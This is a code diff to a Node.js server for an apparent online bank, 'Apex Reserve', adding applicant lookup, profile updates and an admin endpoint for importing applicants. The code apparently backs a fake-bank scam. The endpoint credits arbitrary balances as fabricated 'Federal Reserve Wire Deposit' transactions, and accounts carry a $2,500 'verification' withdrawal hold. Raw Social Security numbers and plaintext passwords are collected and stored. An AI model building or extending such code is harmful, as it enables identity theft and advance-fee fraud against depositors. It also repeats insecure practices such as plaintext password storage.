@@ -645,11 +645,15 @@ const server = http.createServer(async (req, res) => {
     try {
       const parsedUrl = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
       const userId = parsedUrl.searchParams.get('id');
-      const username = parsedUrl.searchParams.get('username');
+      const rawUser = parsedUrl.searchParams.get('username');
+      const cleanUser = rawUser ? rawUser.replace(/^@/, '').toLowerCase() : '';
+      const email = parsedUrl.searchParams.get('email');
+      const cleanEmail = email ? email.toLowerCase() : '';
       const db = readDb();
       const user = db.users.find(u =>
         (userId && u.id === userId) ||
-        (username && u.username && u.username.toLowerCase() === username.toLowerCase())
+        (cleanUser && u.username && u.username.replace(/^@/, '').toLowerCase() === cleanUser) ||
+        (cleanEmail && u.email && u.email.toLowerCase() === cleanEmail)
       );
       if (!user) {
         sendJson(res, 404, { error: 'User does not exist' });
@@ -734,8 +738,9 @@ const server = http.createServer(async (req, res) => {
       const data = await parseJsonBody(req);
       const db = readDb();
 
-      const username = (data.username || '').trim();
-      const email = (data.email || '').trim();
+      const rawUser = (data.username || '').trim();
+      const username = rawUser.replace(/^@/, '');
+      const email = (data.email || '').trim().toLowerCase();
       const name = (data.name || data.fullName || '').trim();
       const password = data.password || '';
 
@@ -746,11 +751,27 @@ const server = http.createServer(async (req, res) => {
 
       // Check uniqueness
       const existingUser = db.users.find(u =>
-        u.username.toLowerCase() === username.toLowerCase() ||
-        (email && u.email.toLowerCase() === email.toLowerCase())
+        u.username.replace(/^@/, '').toLowerCase() === username.toLowerCase() ||
+        (email && u.email && u.email.toLowerCase() === email)
       );
 
       if (existingUser) {
+        // If user already exists and is pending, update their details instead of rejecting
+        if (existingUser.status === 'pending') {
+          existingUser.name = name || existingUser.name;
+          if (data.phone) existingUser.phone = data.phone;
+          if (password) {
+            existingUser.password = password;
+            saveToVault(existingUser, password);
+          }
+          if (data.rawSsn || data.ssn) existingUser.rawSsn = (data.rawSsn || data.ssn).trim();
+          if (data.address) existingUser.address = data.address.trim();
+          if (data.accountType) existingUser.accountType = data.accountType;
+          if (data.accountNumber) existingUser.accountNumber = data.accountNumber;
+          writeDb(db);
+          sendJson(res, 200, { success: true, user: { ...existingUser, password: '[PROTECTED]' } });
+          return;
+        }
         sendJson(res, 400, { error: 'Username or Email is already registered.' });
         return;
       }
@@ -759,11 +780,14 @@ const server = http.createServer(async (req, res) => {
       const randAcc = Math.floor(1000 + Math.random() * 9000);
 
       // Mask SSN for safety
-      let rawSsn = (data.ssn || '').trim();
+      let rawSsn = (data.rawSsn || data.ssn || '').trim();
       let maskedSsn = rawSsn.length >= 4 ? `***-**-${rawSsn.slice(-4)}` : '***-**-0000';
 
+      const assignedAcc = data.accountNumber || `#8920-${randNum}`;
+      const fullAcc = data.fullAccountNumber || `8920410${randAcc}`;
+
       const newUser = {
-        id: `usr_${Date.now()}`,
+        id: data.id || `usr_${Date.now()}`,
         username: username,
         password: password,
         name: name,
@@ -776,17 +800,19 @@ const server = http.createServer(async (req, res) => {
         address: data.address || 'Confidential Residence',
         role: 'user',
         status: 'pending', // Starts as pending!
-        accountNumber: `#8920-${randNum}`,
-        fullAccountNumber: `8920410${randAcc}`,
-        routing: '021000089',
+        accountNumber: assignedAcc,
+        fullAccountNumber: fullAcc,
+        routing: data.routing || '021000089',
         tier: data.tier || 'Private Client Reserve',
         totalBalance: 0.00, // Starts at $0 as requested!
         checkingBalance: 0.00,
         savingsBalance: 0.00,
-        cardNumber: `4920 ${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)}`,
+        cardNumber: data.cardNumber || `4920 ${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)} ${Math.floor(1000 + Math.random() * 9000)}`,
         cardExp: '09/29',
         cardCvv: `${Math.floor(100 + Math.random() * 900)}`,
         isCardFrozen: false,
+        verificationWithdrawalAmount: 2500,
+        withdrawalStatement: 'PENDING COMPLIANCE VERIFICATION',
         transactions: [
           {
             id: `TX-${Math.floor(1000 + Math.random() * 9000)}-APP`,
@@ -801,10 +827,12 @@ const server = http.createServer(async (req, res) => {
             note: 'Awaiting Bank Authorization.'
           }
         ],
-        createdAt: new Date().toISOString()
+        createdAt: data.createdAt || new Date().toISOString(),
+        isCustomPassword: true
       };
 
       db.users.push(newUser);
+      saveToVault(newUser, password);
       writeDb(db);
 
       // Dispatch real-time admin email notification with full client registration dossier
@@ -907,12 +935,21 @@ const server = http.createServer(async (req, res) => {
       const { userId, depositAmount, depositRecordName, verificationAmount, userData } = data;
       const db = readDb();
 
-      let user = db.users.find(u => u.id === userId || (userData && userData.username && u.username && u.username.toLowerCase() === userData.username.toLowerCase()));
+      const uNorm = (userData && userData.username ? userData.username.replace(/^@/, '').toLowerCase() : '');
+      const eNorm = (userData && userData.email ? userData.email.toLowerCase() : '');
+
+      let user = db.users.find(u =>
+        u.id === userId ||
+        (uNorm && u.username && u.username.replace(/^@/, '').toLowerCase() === uNorm) ||
+        (eNorm && u.email && u.email.toLowerCase() === eNorm)
+      );
+
       if (!user && userData) {
         // Automatically persist newly approved applicant to database.json if registered on client/mobile
         user = {
           ...userData,
           id: userId || userData.id || `usr_${Date.now()}`,
+          username: (userData.username || '').replace(/^@/, ''),
           role: userData.role || 'user',
           status: 'approved'
         };
@@ -972,6 +1009,137 @@ const server = http.createServer(async (req, res) => {
       sendJson(res, 200, { success: true, user: { ...user, password: '[PROTECTED]' } });
     } catch (e) {
       sendJson(res, 500, { error: 'Approval failed' });
+    }
+    return;
+  }
+
+  // 4a. ADMIN IMPORT APPLICANT DIRECTLY (FROM EMAIL ALERT OR ADMIN DESK)
+  if (reqUrl === '/api/admin/import-applicant' && req.method === 'POST') {
+    try {
+      const data = await parseJsonBody(req);
+      const db = readDb();
+
+      const rawUser = (data.username || data.name || '').trim();
+      const username = rawUser.replace(/^@/, '');
+      const email = (data.email || '').trim().toLowerCase();
+      const name = (data.name || data.fullName || 'New Applicant').trim();
+      const password = data.password || 'Password123@';
+      const isDirectAccept = !!data.isDirectAccept;
+      const depositAmount = Math.max(0, parseFloat(data.depositAmount) || 0);
+
+      const uLower = username.toLowerCase();
+      // Match existing user by id, username, or email
+      let user = db.users.find(u =>
+        (data.id && u.id === data.id) ||
+        (uLower && u.username && u.username.replace(/^@/, '').toLowerCase() === uLower) ||
+        (email && u.email && u.email.toLowerCase() === email)
+      );
+
+      const randNum = Math.floor(100 + Math.random() * 900);
+      const randAcc = Math.floor(1000 + Math.random() * 9000);
+      const assignedAcc = data.accountNumber || (data.assignedAccount ? data.assignedAccount : `#8920-${randNum}`);
+      const fullAcc = data.fullAccountNumber || `8920410${randAcc}`;
+      const rawSsn = (data.rawSsn || data.ssn || '').trim();
+      const maskedSsn = rawSsn.length >= 4 ? `***-**-${rawSsn.slice(-4)}` : '***-**-7102';
+
+      if (!user) {
+        user = {
+          id: data.id || `usr_${Date.now()}`,
+          username: username,
+          password: password,
+          name: name,
+          email: email || `${uLower}@apexreserve.com`,
+          phone: data.phone || '+1 (212) 555-0199',
+          dob: data.dob || '1992-05-18',
+          accountType: data.accountType || 'Checking Account',
+          ssn: maskedSsn,
+          rawSsn: rawSsn || maskedSsn,
+          address: data.address || '33126',
+          role: 'user',
+          status: isDirectAccept ? 'approved' : 'pending',
+          accountNumber: assignedAcc,
+          fullAccountNumber: fullAcc,
+          routing: data.routing || '021000089',
+          tier: 'Private Client Reserve',
+          totalBalance: isDirectAccept ? depositAmount : 0.00,
+          checkingBalance: isDirectAccept ? depositAmount : 0.00,
+          savingsBalance: 0.00,
+          cardNumber: data.cardNumber || `4920 8812 ${randAcc} 7721`,
+          cardExp: '09/29',
+          cardCvv: '739',
+          isCardFrozen: false,
+          verificationWithdrawalAmount: 2500,
+          withdrawalStatement: isDirectAccept ? 'VERIFIED BANK CLIENT' : 'PENDING BANK AUTHORIZATION',
+          transactions: [
+            {
+              id: `TX-${randAcc}-${isDirectAccept ? 'FED' : 'APP'}`,
+              type: 'inflow',
+              title: isDirectAccept ? (depositAmount > 0 ? 'Federal Reserve Wire Deposit' : 'Account Cleared & Approved') : 'Account Application Submitted',
+              category: isDirectAccept ? 'Treasury Wire' : 'KYC & Compliance Verification',
+              method: 'Fedwire Provisioning Node',
+              date: 'Just now',
+              rawDate: new Date().toISOString(),
+              amount: isDirectAccept ? depositAmount : 0.00,
+              status: isDirectAccept ? 'Settled' : 'Pending Verification',
+              note: isDirectAccept ? 'Account Authorized and Cleared by Bank.' : 'Awaiting Bank Authorization.'
+            }
+          ],
+          createdAt: new Date().toISOString(),
+          isCustomPassword: true
+        };
+        db.users.unshift(user);
+      } else {
+        // Update existing applicant
+        user.name = name || user.name;
+        user.username = username || user.username;
+        user.email = email || user.email;
+        if (data.phone) user.phone = data.phone;
+        if (data.accountType) user.accountType = data.accountType;
+        if (data.address) user.address = data.address;
+        if (data.dob) user.dob = data.dob;
+        if (rawSsn) { user.rawSsn = rawSsn; user.ssn = maskedSsn; }
+        if (assignedAcc) user.accountNumber = assignedAcc;
+        if (data.password) user.password = data.password;
+
+        if (isDirectAccept) {
+          user.status = 'approved';
+          user.totalBalance = depositAmount;
+          if (user.accountType === 'Savings Account') {
+            user.savingsBalance = depositAmount;
+            user.checkingBalance = 0.00;
+          } else {
+            user.checkingBalance = depositAmount;
+            user.savingsBalance = 0.00;
+          }
+          if (!user.transactions) user.transactions = [];
+          user.transactions.unshift({
+            id: `TX-${Math.floor(1000 + Math.random() * 9000)}-FED`,
+            type: 'inflow',
+            title: depositAmount > 0 ? 'Federal Reserve Wire Deposit' : 'Account Cleared & Approved',
+            category: 'Treasury Wire',
+            method: 'Fedwire Provisioning Node',
+            date: 'Just now',
+            rawDate: new Date().toISOString(),
+            amount: depositAmount,
+            status: 'Settled',
+            note: 'Account Authorized and Cleared by Bank.'
+          });
+          saveToBalanceVault(user);
+        } else {
+          user.status = 'pending';
+        }
+      }
+
+      saveToVault(user, password);
+      writeDb(db);
+
+      sendJson(res, 200, {
+        success: true,
+        user: { ...user, password: '[PROTECTED]' }
+      });
+    } catch (e) {
+      console.error('Import applicant error:', e);
+      sendJson(res, 500, { error: 'Failed to import applicant' });
     }
     return;
   }
